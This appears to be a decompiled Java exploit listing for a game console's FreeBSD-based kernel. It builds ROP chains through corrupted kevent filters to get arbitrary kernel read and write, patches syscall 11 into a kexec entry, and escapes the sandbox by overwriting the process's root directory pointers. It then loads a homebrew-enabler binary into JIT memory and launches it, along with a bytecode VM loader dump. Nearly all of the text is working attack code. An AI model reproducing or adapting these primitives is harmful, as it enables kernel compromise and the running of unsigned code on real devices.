+ 1146  unsafe.putLong(l112 + 32L, l4);
+ 1147  if (unsafe.getLong(l112 + 32L) != l4) {
+ 1148  return this.fin(unsafe, "f_touch swap readback");
+ 1150  this.lg(unsafe, "J f_touch=" + Hx1400.h16(l4) + " - firing EV_ADD -23 once");
+ 1151  unsafe.setMemory(l77, 64L, (byte)0);
+ 1152  unsafe.putLong(l77, this.gIDENT);
+ 1153  unsafe.putShort(l77 + 8L, (short)-23);
+ 1154  unsafe.putShort(l77 + 10L, (short)1);
+ 1155  long l127 = Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L));
+ 1156  unsafe.putLong(l112 + 32L, this.ka(R_TOUCH));
+ 1157  this.lg(unsafe, "J kevent rc=" + l127 + " ; f_touch restored to the pivot");
+ 1158  l125 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
+ 1161  this.lg(unsafe, "K sysent[11].sy_call=" + Hx1400.h16(l125) + " want=" + Hx1400.h16(l128) + "  APPLIED=" + bl10);
+ 1164  int n49 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[i]), GLEN[i]);
+ 1169  this.lg(unsafe, stringBuffer4.toString());
+ 1170  this.lg(unsafe, "K " + n46 + "/6 sites now hold the PATCHED byte");
+ 1171  long l129 = this.kbytes(unsafe, l52, l77, l6, this.ka(17837440L), 4);
+ 1172  this.lg(unsafe, "K sysent[11].sy_narg=" + l129 + " (payload writes 2)");
+ 1174  this.lg(unsafe, bl9 ? "K *** 1400.bin APPLIED - syscall 11 IS NOW kexec ***" : "K NOT fully applied");
+ 1176  l5 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
+ 1180  this.lg(unsafe, "K already patched: sysent[11].sy_call=" + Hx1400.h16(l5) + " want=" + Hx1400.h16(this.ka(KEXECG)) + " kexec live=" + bl9);
+ 1183  l4 = this.kread(unsafe, l52, l77, l6, l5);
+ 1185  this.lg(unsafe, "L console-sink byte @" + Hx1400.h16(l5) + " = " + Hx1400.h16(l4) + " sig=" + (n7 != 0) + " (want ..ff ff ff ff ff 20)");
+ 1186  this.kwrite(unsafe, l52, l77, l6, l5, l4 & 0xFFFFFFFFFFFFFF00L | 0L);
+ 1187  long l130 = this.kread(unsafe, l52, l77, l6, l5);
+ 1189  this.lg(unsafe, "L set to 0x" + Integer.toHexString(0) + " -> " + Hx1400.h16(l130) + " ok=" + bl11);
+ 1190  this.lg(unsafe, "L this byte is read by ONE getter at RVA 0x1d6e00, called from two sites:");
+ 1191  this.lg(unsafe, "L   0x486db0: test al,al ; je skip   -> a zero SKIPS that block");
+ 1192  this.lg(unsafe, "L   0x1cf813: r15 = al ? al : r14d ; then call [rax+0x20] per console device");
+ 1193  this.lg(unsafe, "L   the second is the console device-list walk = the UART path. If UART is");
+ 1194  this.lg(unsafe, "L   still thin with 0, the polarity is inverted - say so and DCO_SET flips.");
+ 1197  long l133 = this.kread(unsafe, l52, l77, l6, l131);
+ 1198  long l134 = this.kread(unsafe, l52, l77, l6, l132);
+ 1204  l3 = this.kread(unsafe, l52, l77, l6, l137);
+ 1205  if ((this.kread(unsafe, l52, l77, l6, l137 + 176L) & 0xFFFFFFFFL) == this.pid) {
+ 1207  l136 = this.kread(unsafe, l52, l77, l6, l137 + 72L);
+ 1215  this.kwrite(unsafe, l52, l77, l6, l136 + 16L, l134);
+ 1216  this.kwrite(unsafe, l52, l77, l6, l136 + 24L, l134);
+ 1217  this.kwrite(unsafe, l52, l77, l6, l136 + 32L, l134);
+ 1218  n50 = this.kread(unsafe, l52, l77, l6, l136 + 16L) == l134 ? 1 : 0;
+ 1220  this.lg(unsafe, "M proc=" + Hx1400.h16(l135) + " pfd=" + Hx1400.h16(l136) + " rootvn=" + Hx1400.h16(l134) + " escaped=" + (n50 != 0));
+ 1222  l3 = this.cstr(unsafe, "/data/hen/hen.ini");
+ 1223  long l138 = this.cstr(unsafe, "/data/hen");
+ 1224  long l139 = Hx1400.sx(this.ac(unsafe, l14, l138, 511L, 0L, 0L, 0L, 0L));
+ 1225  long l140 = Hx1400.sx(this.ac(unsafe, l43, l3, 1537L, 438L, 0L, 0L, 0L));
+ 1228  l2 = unsafe.allocateMemory(string2.length());
+ 1230  unsafe.putByte(l2 + (long)i, (byte)string2.charAt(i));
+ 1232  l141 = Hx1400.sx(this.ac(unsafe, l42, l140, l2, string2.length(), 0L, 0L, 0L));
+ 1233  this.ac(unsafe, l44, l140, 0L, 0L, 0L, 0L, 0L);
+ 1235  this.lg(unsafe, "M mkdir(/data/hen)=" + l139 + " open(hen.ini,CREAT|TRUNC)=" + l140 + " wrote=" + l141 + "/" + string2.length());
+ 1236  l2 = Hx1400.sx(this.ac(unsafe, l43, l3, 0L, 0L, 0L, 0L, 0L));
+ 1239  l = unsafe.allocateMemory(512L);
+ 1240  unsafe.setMemory(l, 512L, (byte)0);
+ 1241  l142 = Hx1400.sx(this.ac(unsafe, l15, l2, l, 256L, 0L, 0L, 0L));
+ 1244  n5 = unsafe.getByte(l + (long)n6) & 0xFF;
+ 1247  this.ac(unsafe, l44, l2, 0L, 0L, 0L, 0L, 0L);
+ 1248  this.lg(unsafe, "M readback " + l142 + " B: " + stringBuffer5.toString());
+ 1251  this.lg(unsafe, "M \u26a0 the on-disk config was NOT written - HEN will use whatever is already there");
+ 1255  this.lg(unsafe, "N klog is HEN's job: plugin_server.prx serves 3232 from five merged sources. This probe deliberately does not open /dev/klog.");
+ 1260  this.safeDown(unsafe, "G");
+ 1261  long l145 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1262  this.lg(unsafe, "G uid re-read=" + l145);
+ 1265  if (nArray7[i] <= 0 || Hx1400.sx(this.ac(unsafe, l44, nArray7[i], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1269  this.lg(unsafe, "H1 released " + n51 + "/" + n30 + " spray sockets for the fetch (victims stay open)");
+ 1273  long l146 = this.cstr(unsafe, stringArray2[i]);
+ 1274  long l147 = Hx1400.sx(this.ac(unsafe, l43, l146, 0L, 0L, 0L, 0L, 0L));
+ 1277  this.ac(unsafe, l44, l147, 0L, 0L, 0L, 0L, 0L);
+ 1279  this.lg(unsafe, stringBuffer6.toString());
+ 1280  long l148 = Hx1400.sx(this.ac(unsafe, l60, 0L, 589824L, 7L, 0L, 0L, 0L));
+ 1282  return this.fin(unsafe, "jitshm for hen rc=" + l148);
+ 1284  long l149 = this.ac(unsafe, l50, 0x950000000L, 589824L, 7L, 17L, l148, 0L);
+ 1286  l149 = this.ac(unsafe, l50, 0L, 589824L, 7L, 1L, l148, 0L);
+ 1289  return this.fin(unsafe, "jitshm mmap for hen failed");
+ 1291  unsafe.setMemory(l149, 589824L, (byte)0);
+ 1292  this.lg(unsafe, "H3 hen map=" + Hx1400.hz(l149) + " span=" + Hx1400.hz(589824L) + " fd=" + l148);
+ 1309  unsafe.putByte(l149 + l150 + (long)n3, byArray4[n3]);
+ 1325  this.lg(unsafe, "H4 fetched " + l150 + "/" + HEN_SIZE + " B via " + (HENURL == null ? "lan" : "session") + " err=" + string3);
+ 1327  return this.fin(unsafe, "hen.bin is " + l150 + " B, expected " + HEN_SIZE);
+ 1329  int n52 = unsafe.getByte(l149) & 0xFF;
+ 1330  int n53 = unsafe.getByte(l149 + 1L) & 0xFF;
+ 1331  n4 = unsafe.getByte(l149 + 2L) & 0xFF;
+ 1332  n3 = unsafe.getByte(l149 + 3L) & 0xFF;
+ 1333  int n54 = unsafe.getByte(l149 + 4L) & 0xFF;
+ 1338  if (unsafe.getLong(l149 + i) == 0L) continue;
+ 1341  this.lg(unsafe, "H5 head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " (want 0x" + Integer.toHexString(HEN_ENTRY) + ") bssNonZero=" + n57);
+ 1344  return this.fin(unsafe, "hen image: head=" + Integer.toHexString(n52) + " entry=0x" + Integer.toHexString(n56) + " bss=" + n57);
+ 1346  this.lg(unsafe, "H5 *** 519072 defer-shellui build VERIFIED IN PLACE ***");
+ 1353  int n58 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
+ 1359  unsafe.putByte(l149 + (long)nArray8[i], (byte)(48 + nArray9[i]));
+ 1360  n2 = unsafe.getByte(l149 + (long)nArray8[i]) & 0xFF;
+ 1363  this.lg(unsafe, stringBuffer7.toString());
+ 1365  return this.fin(unsafe, "an embedded config byte is not '0'/'1' - wrong build or offsets");
+ 1367  this.lg(unsafe, "H5b \u2605 patched IN THE IMAGE, so it applies even if /data/hen/hen.ini does not");
+ 1368  this.lg(unsafe, "H5c launching");
+ 1373  n2 = l151 != 0L ? unsafe.getByte(l151) & 0xFF : 0;
+ 1374  this.lg(unsafe, "H6 pthread_create=" + Hx1400.hz(l151) + " prologue=" + Integer.toHexString(n2));
+ 1376  return this.fin(unsafe, "pthread_create not resolved");
+ 1379  return this.fin(unsafe, "pthread_create prologue " + Integer.toHexString(n2));
+ 1381  long l152 = unsafe.allocateMemory(64L);
+ 1382  unsafe.setMemory(l152, 64L, (byte)0);
+ 1384  l153 = Hx1400.sx(this.ac(unsafe, l151, l152, 0L, l149, 0L, 0L, 0L));
+ 1385  this.lg(unsafe, "H7 pthread_create rc=" + l153 + " handle=" + Hx1400.h16(unsafe.getLong(l152)));
+ 1387  this.lg(unsafe, "H7 *** hen.bin RUNNING - leaving it alone, no exit, no poll ***");
+ 1389  this.lg(unsafe, "H8 klog untouched by this probe - HEN owns it");
+ 1395  if (Hx1400.sx(this.ac(unsafe, l44, nArray4[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1401  if (Hx1400.sx(this.ac(unsafe, l44, n26, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1407  if (Hx1400.sx(this.ac(unsafe, l44, l101, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1413  if (Hx1400.sx(this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1420  if (Hx1400.sx(this.ac(unsafe, l44, nArray6[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1430  this.lg(unsafe, "H8 teardown: released " + n59 + "/" + n60 + " descriptors (victims safe - refcount is pinned)");
+ 1431  this.lg(unsafe, "H8 kept: hen map " + Hx1400.hz(l149) + " fd " + l148 + ", blob map, fake page " + Hx1400.hz(l107) + " - hen.bin runs from one of them");
+ 1432  this.lg(unsafe, "H8 *** the host process can now exit; HEN owns the console ***");
+ 1442  this.lg(unsafe, "G kbase=" + Hx1400.h16(this.kbase) + " slot=" + Hx1400.h16(l116) + " ops=" + Hx1400.h16(l117));
+ 1451  this.lg(unsafe, "F: " + result);
+ 1460  void node(Unsafe unsafe, long l, long l2, long l3, long l4, int n, long l5) {
+ 1461  unsafe.putLong(l, l2);
+ 1462  unsafe.putLong(l + 8L, l3);
+ 1463  unsafe.putLong(l + 16L, l4);
+ 1464  unsafe.putInt(l + 24L, n);
+ 1465  unsafe.putInt(l + 32L, (int)l5);
+ 1466  unsafe.putByte(l + 36L, (byte)1);
+ 1467  unsafe.putByte(l + 37L, (byte)1);
+ 1470  int w8(Unsafe unsafe, long l, int n, long l2) {
+ 1471  unsafe.putLong(l + (long)n * 8L, l2);
+ 1479  long kbytes(Unsafe unsafe, long l, long l2, long l3, long l4, int n) {
+ 1482  long l6 = this.kread(unsafe, l, l2, l3, l5) >>> n2;
+ 1484  l6 |= this.kread(unsafe, l, l2, l3, l5 + 8L) << 64 - n2;
+ 1498  long cstr(Unsafe unsafe, String string) {
+ 1499  long l = unsafe.allocateMemory((long)string.length() + 1L);
+ 1500  unsafe.setMemory(l, (long)string.length() + 1L, (byte)0);
+ 1502  unsafe.putByte(l + (long)i, (byte)string.charAt(i));
+ 1507  int kb0(Unsafe unsafe) {
+ 1509  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1510  n = this.w8(unsafe, this.gSTACK, n, this.gCTX);
+ 1511  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_SAVE));
+ 1515  int kb1(Unsafe unsafe, int n) {
+ 1516  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1517  n = this.w8(unsafe, this.gSTACK, n, 5570198814713989681L);
+ 1518  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1519  n = this.w8(unsafe, this.gSTACK, n, this.gMARK);
+ 1520  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
+ 1521  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1522  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1523  n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 16L);
+ 1524  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_LDRAX));
+ 1525  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1526  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
+ 1527  n = this.w8(unsafe, this.gSTACK, n, -120L);
+ 1528  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_ADDRAX));
+ 1529  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1530  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1531  n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 8L);
+ 1532  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
+ 1533  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1534  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1535  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_CONT));
+ 1536  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1537  n = this.w8(unsafe, this.gSTACK, n, this.gCTX + 56L);
+ 1538  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
+ 1539  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1540  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1541  n = this.w8(unsafe, this.gSTACK, n, this.gCTX);
+ 1542  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_REST));
+ 1546  boolean kgo(Unsafe unsafe, long l, long l2, long l3, int n) {
+ 1550  unsafe.putLong(this.gMARK, 0L);
+ 1551  unsafe.setMemory(l2, 64L, (byte)0);
+ 1552  unsafe.putLong(l2, this.gIDENT);
+ 1553  unsafe.putShort(l2 + 8L, (short)-23);
+ 1554  unsafe.putShort(l2 + 10L, (short)1);
+ 1555  unsafe.putLong(l2 + 32L, this.ka(R_POPRSP));
+ 1556  unsafe.putLong(l2 + 40L, this.gSTACK);
+ 1557  this.ac(unsafe, l, l3, l2, 2L, 0L, 0L, 0L);
+ 1558  return unsafe.getLong(this.gMARK) == 5570198814713989681L;
+ 1561  long kread(Unsafe unsafe, long l, long l2, long l3, long l4) {
+ 1562  int n = this.kb0(unsafe);
+ 1563  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1564  n = this.w8(unsafe, this.gSTACK, n, l4);
+ 1565  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_LDRAX));
+ 1566  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1567  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDI));
+ 1568  n = this.w8(unsafe, this.gSTACK, n, this.gRES);
+ 1569  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRDIRAX));
+ 1570  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1571  n = this.kb1(unsafe, n);
+ 1572  unsafe.putLong(this.gRES, 0L);
+ 1573  if (!this.kgo(unsafe, l, l2, l3, n)) {
+ 1576  return unsafe.getLong(this.gRES);
+ 1579  boolean kwrite(Unsafe unsafe, long l, long l2, long l3, long l4, long l5) {
+ 1580  int n = this.kb0(unsafe);
+ 1581  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1582  n = this.w8(unsafe, this.gSTACK, n, l4);
+ 1583  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
+ 1584  n = this.w8(unsafe, this.gSTACK, n, l5);
+ 1585  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRAXRDX));
+ 1586  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1587  n = this.kb1(unsafe, n);
+ 1588  return this.kgo(unsafe, l, l2, l3, n);
+ 1591  int uq(Unsafe unsafe, long l, int n, long l2, long l3) {
+ 1592  n = this.w8(unsafe, l, n, this.ka(R_UCRED));
+ 1593  n = this.w8(unsafe, l, n, 0L);
+ 1594  n = this.w8(unsafe, l, n, this.ka(R_RAXRCX));
+ 1595  n = this.w8(unsafe, l, n, 0L);
+ 1596  n = this.w8(unsafe, l, n, this.ka(R_PRDX));
+ 1597  n = this.w8(unsafe, l, n, l2);
+ 1598  n = this.w8(unsafe, l, n, this.ka(R_ADDRAX));
+ 1599  n = this.w8(unsafe, l, n, 0L);
+ 1600  n = this.w8(unsafe, l, n, this.ka(R_PRDX));
+ 1601  n = this.w8(unsafe, l, n, l3);
+ 1602  n = this.w8(unsafe, l, n, this.ka(R_STRAXRDX));
+ 1603  n = this.w8(unsafe, l, n, 0L);
+ 1607  void safeDown(Unsafe unsafe, String string) {
+ 1609  this.lg(unsafe, string + " nothing armed");
+ 1614  unsafe.putInt(this.cFake + 56L, 0x40000000);
+ 1615  unsafe.putLong(this.cFake + 80L, 0L);
+ 1616  unsafe.putLong(this.cFake + 88L, 0L);
+ 1617  unsafe.setMemory(this.cFake + 2304L, 96L, (byte)0);
+ 1618  unsafe.setMemory(this.cFake + 2560L, 96L, (byte)0);
+ 1619  this.lg(unsafe, string + "1 fake pinned: ref=0x" + Integer.toHexString(unsafe.getInt(this.cFake + 56L)) + " srcs=" + Hx1400.h16(unsafe.getLong(this.cFake + 80L)) + " nsrc=" + unsafe.getLong(this.cFake + 88L));
+ 1620  boolean bl = this.cPf != 0L && unsafe.getLong(this.cPf + 8L) == this.ka(R_RET0);
+ 1623  this.lg(unsafe, string + "2 the registry slot was never rotated on this run - nothing to restore");
+ 1626  unsafe.putLong(this.cPf + 32L, this.ka(R_TOUCH));
+ 1627  int n = this.kb0(unsafe);
+ 1628  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRAX));
+ 1629  n = this.w8(unsafe, this.gSTACK, n, this.cSlotA);
+ 1630  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_PRDX));
+ 1631  n = this.w8(unsafe, this.gSTACK, n, this.cOpsV);
+ 1632  n = this.w8(unsafe, this.gSTACK, n, this.ka(R_STRAXRDX));
+ 1633  n = this.w8(unsafe, this.gSTACK, n, 0L);
+ 1634  n = this.kb1(unsafe, n);
+ 1635  bl2 = this.kgo(unsafe, this.cSke, this.cEvB, this.cRkq, n);
+ 1637  this.lg(unsafe, string + "2 sysfilt_ops restore=" + bl2 + " (fakeOps intact=" + bl + ")");
+ 1639  unsafe.setMemory(this.cEvB, 64L, (byte)0);
+ 1640  unsafe.putLong(this.cEvB, this.gIDENT);
+ 1641  unsafe.putShort(this.cEvB + 8L, (short)-23);
+ 1642  unsafe.putShort(this.cEvB + 10L, (short)2);
+ 1643  long l = Hx1400.sx(this.ac(unsafe, this.cSke, this.cRkq, this.cEvB, 1L, 0L, 0L, 0L));
+ 1644  long l2 = Hx1400.sx(this.ac(unsafe, this.cCl, this.cRkq, 0L, 0L, 0L, 0L, 0L));
+ 1645  this.lg(unsafe, string + "3 knote delete=" + l + " bridge kq close=" + l2);
+ 1647  this.lg(unsafe, string + "3 no bridge kqueue on this run");
+ 1649  boolean bl3 = this.cCs != 0L && this.cMsav != 0L && Hx1400.sx(this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L)) == 0L;
+ 1650  this.lg(unsafe, string + "4 QUARANTINED LIVE on purpose: " + this.cNv + " victims + " + this.cN + " spray + anchor/dce stay open, page " + Hx1400.hz(this.cPage) + " stays mapped ; unpinned=" + bl3);
+ 1651  this.lg(unsafe, string + "4 headroom = 0x3fffffff releases before the free branch is reachable");
+ 1664  this.lg(unsafe, string + "! safeDown threw " + throwable.getClass().getName());
+ 1668  String fin(Unsafe unsafe, String string) {
+ 1670  this.safeDown(unsafe, "FIN");
+ 1672  this.lg(unsafe, "F: " + result);
+ 1682  this.ac(unsafe, this.cCl, this.cVs[n2], 0L, 0L, 0L, 0L, 0L);
+ 1687  this.ac(unsafe, this.cCl, this.cAnchor, 0L, 0L, 0L, 0L, 0L);
+ 1691  this.ac(unsafe, this.cCl, this.cDf, 0L, 0L, 0L, 0L, 0L);
+ 1695  this.ac(unsafe, this.cCl, this.cKq, 0L, 0L, 0L, 0L, 0L);
+ 1699  this.ac(unsafe, this.cSo, this.cTgt, 41L, 51L, this.cMb, 248L, 0L);
+ 1704  this.ac(unsafe, this.cCl, this.cPlugs[n2], 0L, 0L, 0L, 0L, 0L);
+ 1710  this.ac(unsafe, this.cCl, this.cRs[n2], 0L, 0L, 0L, 0L, 0L);
+ 1716  this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L);
+ 1723  this.lg(unsafe, "F: " + result);
+ 1727  int wash(Unsafe unsafe, long l, long l2, long l3, long l4, long l5, long l6, long l7, long l8, long l9, int n) {
+ 1736  unsafe.setMemory(l6, 20L, (byte)0);
+ 1737  long l10 = Hx1400.sx(this.ac(unsafe, l, 4097L, l5, 5L, 3L, l6, 0L));
+ 1746  if (unsafe.getInt(l6 + (long)n3 * 4L) != 0) continue;
+ 1754  unsafe.setMemory(l8, 20L, (byte)0);
+ 1755  this.ac(unsafe, l2, l6, 5L, l8, 0L, 0L, 0L);
+ 1758  unsafe.setMemory(l9, 20L, (byte)0);
+ 1759  this.ac(unsafe, l3, l6, 5L, l9, 0L, 0L, 0L);
+ 1760  unsafe.setMemory(l7, 20L, (byte)0);
+ 1761  this.ac(unsafe, l4, l6, 5L, l7, 0L, 0L, 0L);
+ 1764  if (unsafe.getInt(l7 + (long)j * 4L) == 0) continue;
+ 1766  this.wBad = unsafe.getInt(l7 + (long)j * 4L);
+ 1784  void parse(Unsafe unsafe, long l, long l2) {
+ 1795  while (l4 + 16L <= l2 && (n = unsafe.getShort(l + l4) & 0xFFFF) >= 16 && l4 + (long)n <= l2) {
+ 1796  if ((unsafe.getByte(l + l4 + 3L) & 0xFF) == 4 && n >= 40) {
+ 1798  long l6 = (long)unsafe.getInt(l + l4 + 32L) & 0xFFFFFFFFL;
+ 1799  long l7 = (long)unsafe.getInt(l + l4 + 36L) & 0xFFFFFFFFL;
+ 1820  boolean marked(Unsafe unsafe, long l, int n, long l2, long l3) {
+ 1821  unsafe.setMemory(l2, 512L, (byte)0);
+ 1822  unsafe.putInt(l3, 248);
+ 1823  if (Hx1400.sx(this.ac(unsafe, l, n, 41L, 51L, l2, l3, 0L)) != 0L) {
+ 1826  if (unsafe.getInt(l3) != 248) {
+ 1829  return unsafe.getInt(l2 + 8L) == 0x43434343 && unsafe.getInt(l2 + 12L) == 0x54545454;
+ 1832  boolean meq(Unsafe unsafe, long l, long l2) {
+ 1834  if (unsafe.getByte(l + (long)i) == unsafe.getByte(l2 + (long)i)) continue;
+ 1840  void lg(Unsafe unsafe, String string) {
+ 1853  unsafe.putByte(this.logB + (long)i, (byte)(string.charAt(i) & 0x7F));
+ 1855  unsafe.putByte(this.logB + (long)n, (byte)10);
+ 1857  this.ac(unsafe, this.lsto, this.udpS, this.logB, n + 1, 0L, this.logA, 16L);
+ 1861  boolean chk(Unsafe unsafe, long l, int n) {
+ 1866  if ((unsafe.getByte(l) & 0xFF) != 72) {
+ 1869  if ((unsafe.getByte(l + 1L) & 0xFF) != 199) {
+ 1872  if ((unsafe.getByte(l + 2L) & 0xFF) != 192) {
+ 1875  if ((unsafe.getByte(l + 3L) & 0xFF) != (n & 0xFF)) {
+ 1878  if ((unsafe.getByte(l + 4L) & 0xFF) != (n >>> 8 & 0xFF)) {
+ 1881  if ((unsafe.getByte(l + 5L) & 0xFF) != (n >>> 16 & 0xFF)) {
+ 1884  if ((unsafe.getByte(l + 6L) & 0xFF) != (n >>> 24 & 0xFF)) {
+ 1887  if ((unsafe.getByte(l + 7L) & 0xFF) != 73) {
+ 1890  if ((unsafe.getByte(l + 8L) & 0xFF) != 137) {
+ 1893  if ((unsafe.getByte(l + 9L) & 0xFF) != 202) {
+ 1896  if ((unsafe.getByte(l + 10L) & 0xFF) != 15) {
+ 1899  return (unsafe.getByte(l + 11L) & 0xFF) == 5;
+ 1906  long ac(Unsafe unsafe, long l, long l2, long l3, long l4, long l5, long l6, long l7) {
+ 1909  unsafe.putLong(this.lkf + 16L, this.lvf);
+ 1910  unsafe.putLong(this.lkf + 32L, this.lvf);
+ 1911  unsafe.putLong(this.lkf + 184L, 0L);
+ 1912  unsafe.putLong(this.lvf + 560L, i == 0 ? this.lsj + 35L : this.lsc + 57L);
+ 1913  unsafe.putLong(pM + 120L, pF);
+ 1915  unsafe.putLong(pM + 120L, pO);
+ 1917  unsafe.putLong(l8 + 8L, rAK);
+ 1918  unsafe.putLong(l8 + 24L, 0L);
+ 1921  long l9 = unsafe.getLong(this.lkf + 40L);
+ 1922  long l10 = unsafe.getLong(this.lkf + 48L);
+ 1923  long l11 = unsafe.getLong(this.lkf + 56L);
+ 1924  long l12 = unsafe.getLong(this.lkf + 64L);
+ 1925  long l13 = unsafe.getLong(this.lkf + 72L);
+ 1926  long l14 = unsafe.getLong(this.lkf + 80L);
+ 1927  long l15 = unsafe.getLong(this.lkf + 88L);
+ 1928  unsafe.putLong(this.lkf + 104L, l2);
+ 1929  unsafe.putLong(this.lkf + 112L, l3);
+ 1930  unsafe.putLong(this.lkf + 120L, l4);
+ 1931  unsafe.putLong(this.lkf + 128L, l5);
+ 1932  unsafe.putLong(this.lkf + 136L, l6);
+ 1933  unsafe.putLong(this.lkf + 144L, l7);
+ 1934  unsafe.putLong(this.lkf + 160L, l9);
+ 1935  unsafe.putLong(this.lkf + 168L, l11);
+ 1936  unsafe.putLong(this.lkf + 192L, l12);
+ 1937  unsafe.putLong(this.lkf + 200L, l13);
+ 1938  unsafe.putLong(this.lkf + 208L, l14);
+ 1939  unsafe.putLong(this.lkf + 216L, l15);
+ 1940  unsafe.putLong(this.lkf + 256L, l);
+ 1941  unsafe.putLong(this.lkf + 280L, l10);
+ 1949  return unsafe.getLong(l8);
+
+======================================================================
+  Hx1400.java — Static fields / constants
+======================================================================
+   13  public static volatile String result = "not run";
+   14  public static volatile long[] P = null;
+   15  public static volatile long[] PG = null;
+   16  public static volatile int[] PGL = null;
+   17  public static volatile int[] PGN = null;
+   18  public static volatile int[] PGW = null;
+   19  public static volatile String PKB = null;
+   20  static final int[] DM = new int[]{1};
+   40  static final int S_READ = 3;
+   41  static final int S_WRITE = 4;
+   42  static final int S_OPEN = 5;
+   43  static final int S_CLOSE = 6;
+   44  static final int S_MUNMAP = 73;
+   45  static final int S_SOCKET = 97;
+   46  static final int S_SETOPT = 105;
+   47  static final int S_GETOPT = 118;
+   48  static final int S_SYSCTL = 202;
+   49  static final int S_MMAP = 477;
+   50  static final int S_KQUEUE = 362;
+   51  static final int S_KEVENT = 363;
+   52  static final int S_CPUGET = 487;
+   53  static final int S_CPUSET = 488;
+   54  static final int S_FSTAT = 189;
+   55  static final int S_JIT = 533;
+   63  static final String HEN_URL = "file:/__bonk___offline_missing__/hen.bin";
+   65  static final StringBuffer LOGB;
+   68  static final int DCO_SET = 0;
+   69  static final long HEN_MAP = 0x950000000L;
+   70  static final long HEN_SPAN = 589824L;
+   71  static final boolean LAUNCH = true;
+   80  static final boolean KLOG_TCP = true;
+   81  static final int KLOG_PORT = 3232;
+   82  static final int KLOG_WAIT = 150;
+   83  static final int KLOG_PUMP = 1500;
+   84  static final long KLOG_CAP = 0x400000L;
+   85  static final int PLUGINS = 1;
+   86  static final int CFG_FIXES = 1;
+   87  static final int CFG_MMAP = 1;
+   88  static final int CFG_BLOCKUPD = 1;
+   89  static final int CFG_ASLR = 1;
+
+======================================================================
+  Boot.exec VM — all 30 opcode case bodies
+======================================================================
+
+--- OPCODE 1 ---
+                    case 1: {
+                        l = ((DataInputStream)object).readLong();
+                        n = n2;
+                        continue block58;
+                    }
+
+--- OPCODE 2 ---
+                    case 2: {
+                        long l2 = ((DataInputStream)object).readLong();
+                        Screen.println(Long.toHexString(l2));
+                        continue block58;
+                    }
+
+--- OPCODE 3 ---
+                    case 3: {
+                        long l3 = ((DataInputStream)object).readLong();
+                        long l4 = ((DataInputStream)object).readLong();
+                        try {
+                            Thread.sleep(l3);
+                        }
+                        catch (Throwable throwable) {}
+                        continue block58;
+                    }
+
+--- OPCODE 4 ---
+                    case 4: {
+                        long l5 = ((DataInputStream)object).readLong();
+                        for (long i = 0L; i < l5; ++i) {
+                            burn = burn * 6364136223846793005L + i;
+                        }
+                        continue block58;
+                    }
+
+--- OPCODE 5 ---
+                    case 5: {
+                        int n4 = (int)((DataInputStream)object).readLong();
+                        int n5 = ((DataInputStream)object).readInt();
+                        byte[] byArray2 = new byte[n5];
+                        ((DataInputStream)object).readFully(byArray2);
+                        Boot.S[n4] = new String(byArray2, "UTF-8");
+                        continue block58;
+                    }
+
+--- OPCODE 6 ---
+                    case 6: {
+                        int n6 = (int)((DataInputStream)object).readLong();
+                        int n7 = ((DataInputStream)object).readInt();
+                        byte[] byArray3 = new byte[n7];
+                        ((DataInputStream)object).readFully(byArray3);
+                        Boot.Z[n6] = byArray3;
+                        continue block58;
+                    }
+
+--- OPCODE 7 ---
+                    case 7: {
+                        int n8 = (int)((DataInputStream)object).readLong();
